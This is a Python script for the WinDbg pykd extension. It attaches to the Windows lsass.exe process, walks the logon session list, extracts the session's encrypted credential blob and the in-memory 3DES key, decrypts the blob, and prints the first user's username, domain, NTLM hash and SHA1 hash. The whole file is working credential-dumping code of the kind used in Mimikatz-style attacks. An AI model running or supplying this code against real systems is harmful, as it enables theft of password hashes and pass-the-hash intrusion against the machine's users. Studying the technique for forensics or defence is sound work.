import pykd
import time
from pyDes import *
from binascii import unhexlify,hexlify

#.load C:\Users\uf0\Desktop\pykd\pykd.dll
# !py c:\users\uf0\desktop\lsass.py
blob = pykd.dbgCommand("!process 0 0 lsass.exe")
eproc =  blob.split(' ')[1]
cmd1 = ".process /i /p /r %s" % eproc
print cmd1
pykd.dbgCommand(cmd1)
time.sleep(1)
pykd.go()
# reload userland modules
pykd.dbgCommand(".reload /user")
time.sleep(1)

#retrieve usename and logondomain
users_blob = pykd.dbgCommand("!list -x \"dS @$extret+0x90;dS @$extret+0xa0\" poi(lsasrv!LogonSessionList)")
users_pretty = users_blob.split('\n\n')
first_user_data  = users_pretty[0] # weak this index to access multiple users	
first_user_data_neato = first_user_data.split('\n')
first_username    = first_user_data_neato[0].split('  ')[1]
first_logondomain = first_user_data_neato[1].split('  ')[1]

# retrieve crypto blob from each user
crypto_blob = pykd.dbgCommand("!list -x \"db poi(poi(@$extret+0x108)+0x10)+0x30 L1B0\" poi(lsasrv!LogonSessionList)")
# parse it and polish it
crypto_pretty = crypto_blob.split('\n\n')
# saves the first user's blob
first_user_crypto  = crypto_pretty[0]

# dump encrypted bytes of the 1st user
first_user_crypto_neato = first_user_crypto.split('  ')[1::2]
first_crypto = ''.join(first_user_crypto_neato)
first_crypto =  unhexlify(first_crypto.replace(" ", "").replace("-",""))
print "\n(*) first user's crypto"
print hexlify(first_crypto)

# find 3DES key
tripdes_key_blob = pykd.dbgCommand("db (poi(poi(lsasrv!h3DesKey)+0x10)+0x38)+4 L18")

#print tripdes_key_blob
tripdes_key = tripdes_key_blob.split('  ')[1::2][:2]
tripdes_key =  unhexlify("".join(tripdes_key).replace(" ", "").replace("-",""))
print "\n(*) 3des key"
print hexlify(tripdes_key)

# decrypting the blob - the iv can be anything sinc CBC is not using it
k = triple_des(tripdes_key, CBC, "\x00\x0d\x56\x99\x63\x93\x95\xd0")
a = k.decrypt(first_crypto) 
decrypted_dump = ":".join("{:02x}".format(ord(c)) for c in a)
#print "\n(*) Decrypted blob"
#print decrypted_dum
decrypted_dump_list = decrypted_dump.split(":")

print "\n(*)USERNAME :" + first_username
print "(*)LOGONDOMAIN :" + first_logondomain
print "(*)NTLM :" + "".join(decrypted_dump_list[74:90])
print "(*)SHA1 :" + "".join(decrypted_dump_list[106:126])
